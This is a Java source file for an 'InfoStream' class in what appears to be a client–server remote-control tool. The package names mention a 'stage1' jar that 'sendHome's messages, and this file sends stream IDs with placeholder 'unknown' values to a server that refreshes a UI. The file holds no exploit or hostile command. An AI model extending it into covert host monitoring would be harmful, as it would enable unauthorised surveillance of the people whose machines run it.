package subterranean.crimson.universal.streams;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;

public class InfoStream extends Stream {

	public InfoStream(long p, boolean i, Connection c) {
		super(p, i, c);
		ClientCommands.startInfoStream(c, getStreamID(), p);
	}

	public InfoStream(long p, boolean i) {
		super(p, i);
		start();
	}

	@Override
	public void received(Message m) {
		// update the profile
		// c.getProfile().info.cpuUsage = (String) m.auxObject[1];
		MainPane.dp.updateAll();
	}

	@Override
	public void send() {
		Message m = new Message(Utilities.randId(), BMN.STREAM_data);

		Object[] o = { getStreamID(), "unknown", "unknown" };
		m.auxObject = o;

		Communications.sendHome(m);
	}

}
